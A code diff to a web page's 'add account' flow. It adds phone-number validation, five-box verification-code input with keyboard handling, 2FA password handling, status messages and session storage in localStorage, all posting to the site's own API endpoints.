@@ -125,6 +125,12 @@
             border-left: 4px solid #2e7d32;
         }
         
+        .info-message {
+            background: #e3f2fd;
+            color: #01579b;
+            border-left: 4px solid #0088cc;
+        }
+        
         .link {
             text-align: center;
             margin-top: 15px;
@@ -157,11 +163,11 @@
         
         <div id="step2" style="display: none;">
             <div class="code-inputs">
+                <input type="text" class="code-input" maxlength="1" onkeyup="moveToNext(this, 0)">
                 <input type="text" class="code-input" maxlength="1" onkeyup="moveToNext(this, 1)">
                 <input type="text" class="code-input" maxlength="1" onkeyup="moveToNext(this, 2)">
                 <input type="text" class="code-input" maxlength="1" onkeyup="moveToNext(this, 3)">
                 <input type="text" class="code-input" maxlength="1" onkeyup="moveToNext(this, 4)">
-                <input type="text" class="code-input" maxlength="1" onkeyup="moveToNext(this, 5)">
             </div>
             <button onclick="verifyCode()" id="verifyBtn">Verify Code</button>
             <button onclick="backToPhone()" style="background: #666;">Back</button>
@@ -176,7 +182,7 @@
         <div id="message"></div>
         
         <div class="link">
-            <a href="/home">Go→</a>
+            <a href="/home">Go to Dashboard →</a>
         </div>
     </div>
 
@@ -197,11 +203,16 @@
                 return;
             }
             
+            // Basic phone number validation
+            if (!phone.startsWith('+')) {
+                showMessage('Phone number must start with + (e.g., +1234567890)', 'error');
+                return;
+            }
+            
             phoneNumber = phone;
             document.getElementById('sendBtn').disabled = true;
-            showMessage('Sending code...', 'info');
+            showMessage('Sending code...', 'info-message');
             
-            // CHANGED: Using /api/add-account instead of /api/send-otp
             fetch('/api/add-account', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -219,6 +230,9 @@
                     
                     // Focus first input
                     document.querySelector('.code-input').focus();
+                    
+                    // Store session in localStorage for backup
+                    localStorage.setItem('lastSessionId', sessionId);
                 } else {
                     showMessage(data.error || 'Failed to send code', 'error');
                 }
@@ -231,16 +245,28 @@
         }
         
         function moveToNext(input, index) {
+            // Auto move to next input
             if (input.value.length === 1) {
-                const next = document.querySelector(`.code-input:nth-child(${index + 1})`);
+                const next = document.querySelectorAll('.code-input')[index + 1];
                 if (next) next.focus();
             }
+            
+            // Allow backspace to go to previous
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && !input.value) {
+                    const prev = document.querySelectorAll('.code-input')[index - 1];
+                    if (prev) {
+                        prev.focus();
+                        prev.value = '';
+                    }
+                }
+            });
             
             // Auto submit when all fields are filled
             const inputs = document.querySelectorAll('.code-input');
             const allFilled = Array.from(inputs).every(i => i.value.length === 1);
             if (allFilled) {
-                verifyCode();
+                setTimeout(() => verifyCode(), 100);
             }
         }
         
@@ -254,9 +280,8 @@
             }
             
             document.getElementById('verifyBtn').disabled = true;
-            showMessage('Verifying...', 'info');
+            showMessage('Verifying...', 'info-message');
             
-            // CHANGED: Using /api/verify-code instead of /api/verify-otp
             fetch('/api/verify-code', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -271,15 +296,29 @@
                 
                 if (data.success) {
                     showMessage('✅ Account added successfully!', 'success');
+                    
+                    // Clear stored session
+                    localStorage.removeItem('lastSessionId');
+                    
+                    // Redirect to home
                     setTimeout(() => {
                         window.location.href = '/home';
                     }, 1500);
                 } else if (data.need_password) {
+                    // 2FA required
                     document.getElementById('step2').style.display = 'none';
                     document.getElementById('step3').style.display = 'block';
                     document.getElementById('message').textContent = '';
+                    document.getElementById('password').focus();
                 } else {
                     showMessage(data.error || 'Verification failed', 'error');
+                    
+                    // Clear inputs on error
+                    if (data.error?.toLowerCase().includes('invalid') || 
+                        data.error?.toLowerCase().includes('expired')) {
+                        inputs.forEach(input => input.value = '');
+                        document.querySelector('.code-input').focus();
+                    }
                 }
             })
             .catch(err => {
@@ -298,6 +337,7 @@
             }
             
             document.getElementById('passwordBtn').disabled = true;
+            showMessage('Verifying password...', 'info-message');
             
             fetch('/api/verify-code', {
                 method: 'POST',
@@ -314,11 +354,18 @@
                 
                 if (data.success) {
                     showMessage('✅ Account added successfully!', 'success');
+                    
+                    // Clear stored session
+                    localStorage.removeItem('lastSessionId');
+                    
+                    // Redirect to home
                     setTimeout(() => {
                         window.location.href = '/home';
                     }, 1500);
                 } else {
                     showMessage(data.error || 'Verification failed', 'error');
+                    document.getElementById('password').value = '';
+                    document.getElementById('password').focus();
                 }
             })
             .catch(err => {
@@ -333,13 +380,45 @@
             document.getElementById('step2').style.display = 'none';
             document.getElementById('step3').style.display = 'none';
             document.getElementById('message').textContent = '';
-            sessionId = null;
             
             // Clear code inputs
             document.querySelectorAll('.code-input').forEach(input => {
                 input.value = '';
             });
+            
+            // Clear password
+            document.getElementById('password').value = '';
+            
+            // Reset session
+            sessionId = null;
+            localStorage.removeItem('lastSessionId');
         }
+        
+        // Check for existing session on page load
+        window.addEventListener('load', function() {
+            const lastSession = localStorage.getItem('lastSessionId');
+            if (lastSession) {
+                sessionId = lastSession;
+                // You could add logic here to resume a session if needed
+            }
+            
+            // Auto-focus phone input
+            document.getElementById('phone').focus();
+        });
+        
+        // Handle enter key in phone input
+        document.getElementById('phone').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                sendCode();
+            }
+        });
+        
+        // Handle enter key in password input
+        document.getElementById('password').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                verifyPassword();
+            }
+        });
     </script>
 </body>
 </html>
